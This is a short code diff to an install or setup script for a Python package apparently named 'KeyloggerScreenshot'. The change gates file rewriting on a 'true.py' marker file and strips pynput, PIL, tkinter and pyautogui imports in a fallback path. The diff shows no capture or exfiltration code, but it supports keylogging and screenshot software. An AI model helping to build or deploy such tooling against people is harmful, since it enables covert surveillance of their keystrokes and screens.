@@ -40,10 +40,14 @@ def write_data(filename, actual_data):
 try:
     import pyautogui as pg
     os.chdir("KeyloggerScreenshot")
-    for every_file in files:
-        data_file = get_data(every_file)
 
-        write_data(every_file, data_file)
+    if "true.py" in os.listdir():
+        for every_file in files:
+            data_file = get_data(every_file)
+
+            write_data(every_file, data_file)
+
+        os.remove("true.py")
 
 except:
     for this_file in files:
@@ -54,6 +58,10 @@ except:
                 if each not in ["import PIL.Image", "from pynput import keyboard", "from pynput.mouse import Listener",
                                 "import tkinter as tk", "import pyautogui as pg"]:
                     file.write(f"{each}\n")
+
+        with open("true.py", "a+") as true_file:
+            true_file.write("var = True")
+
         os.chdir("..")
 
 import KeyloggerScreenshot as ks
